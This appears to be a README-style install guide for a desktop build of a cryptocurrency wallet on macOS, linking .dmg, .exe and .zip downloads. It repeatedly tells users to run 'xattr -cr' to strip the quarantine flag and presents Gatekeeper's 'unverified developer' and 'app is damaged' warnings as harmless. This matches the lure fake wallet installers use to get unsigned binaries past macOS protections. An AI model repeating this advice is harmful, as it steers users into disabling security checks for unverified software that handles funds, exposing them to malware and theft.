[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)

---

# How to Install Muun Wallet on macOS

This guide covers installing Muun Wallet Desktop on macOS, including the standard Gatekeeper step that most users encounter on first launch, and what to do if anything does not open as expected. Muun Wallet v0.5.1 supports Apple Silicon (M1, M2, M3, M4) and Intel Macs running macOS 11 Big Sur or later.

---

## Requirements

- macOS 11 Big Sur or later
- Apple Silicon or Intel processor (one universal build covers both)
- Approximately 150 MB of available disk space
- An internet connection for the first sync after launch

---

## Step 1: Download the macOS installer

Download `muun-wallet-v0.5.1.dmg` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg).

Before opening the file, verify the SHA-256 checksum. Open Terminal and run:

```bash
shasum -a 256 ~/Downloads/muun-wallet-v0.5.1.dmg
```

The output should match exactly:

```
60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b
```

If it does not match, do not open the file. Download again from the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and recheck. See the [download verification guide](how-to-verify-muun-wallet-download.md) for full instructions.

---

## Step 2: Open the disk image and install

Double-click `muun-wallet-v0.5.1.dmg`. A disk image window opens showing the Muun Wallet icon and an Applications folder shortcut. Drag the Muun Wallet icon into Applications.

Wait for the copy to complete — the progress bar should reach 100% before you proceed. Once done, eject the disk image by right-clicking it in the Finder sidebar and choosing Eject, or by dragging it to the Trash.

---

## Step 3: Handle the Gatekeeper prompt

When you double-click Muun Wallet in your Applications folder for the first time, macOS may show a message that the app cannot be opened because it is from an unidentified developer, or that it cannot be verified.

This is macOS Gatekeeper enforcing a quarantine attribute automatically applied to all files downloaded from the internet — it is not specific to Muun Wallet and does not indicate a problem with the installer. To clear it, open Terminal and run:

```bash
xattr -cr /Applications/MuunWallet.app
```

Then try launching Muun Wallet again from Applications. It should open normally. You will not need to repeat this step on future launches.

Alternatively, you can right-click the app icon in Applications, choose Open, and click Open again in the confirmation dialog. This also clears the quarantine flag for this specific app.

---

## Step 4: First launch

On first launch, Muun Wallet generates your wallet and device key locally. Nothing is sent to a remote server during this step. You will be prompted to either create a new wallet or restore an existing one from an Emergency Kit.

If this is your first time with Muun Wallet Desktop, choose to create a new wallet. If you already use Muun on your phone and want to access the same wallet on your Mac, choose restore and use your existing Emergency Kit credentials.

---

## Step 5: Complete the Emergency Kit backup

Immediately after wallet creation, Muun will guide you through setting up your Emergency Kit — a 32-character recovery code combined with a second factor (PDF, password, or email). Complete this before doing anything else, including receiving any funds.

The Emergency Kit is the only way to recover your wallet if your Mac is lost, stolen, or fails. Muun Wallet does not use a standard seed phrase, so this step is not optional. Store your recovery code somewhere physically safe, offline, and separate from your computer.

For a full explanation of how the Emergency Kit works and how it differs from a seed phrase, see the [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md).

---

## Troubleshooting

**The app opens but shows a blank screen or fails to connect.**

This is usually a network issue on first launch. Check your internet connection, quit Muun Wallet, and reopen it. If the problem persists, check whether a firewall or VPN is blocking outbound connections.

**macOS says the app is damaged and should be moved to the Trash.**

This extended attribute error can occur if the quarantine flag was only partially cleared. Run the `xattr -cr` command again in Terminal, then try launching again. If the message persists, re-download the `.dmg` from the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and re-verify the checksum before reinstalling.

**I dragged the app to Applications but cannot find it.**

Open Finder, press Command-Shift-A to open Applications, and look for Muun Wallet. You can also use Spotlight (Command-Space) and type "Muun" to locate it.

**The installer progress bar froze during the copy.**

Force-quit Finder (Option-Command-Escape, select Finder, choose Relaunch), eject the disk image if still mounted, then repeat the drag-to-Applications step.

---

## Updating Muun Wallet

Muun Wallet Desktop includes an auto-update mechanism that checks for new releases on startup and shows a changelog when one is available. You can also update manually by downloading the latest `.dmg` from the [releases page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1), running the new installer over the existing installation, and clearing the quarantine flag again with `xattr -cr` if prompted.

Your wallet data is stored separately from the application files and is not affected by updates or reinstallation.

---

## Related articles

- [How to install Muun Wallet on Windows](how-to-install-muun-wallet-windows.md)
- [How to install Muun Wallet on Linux](how-to-install-muun-wallet-linux.md)
- [How to verify your Muun Wallet download](how-to-verify-muun-wallet-download.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
- [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md)
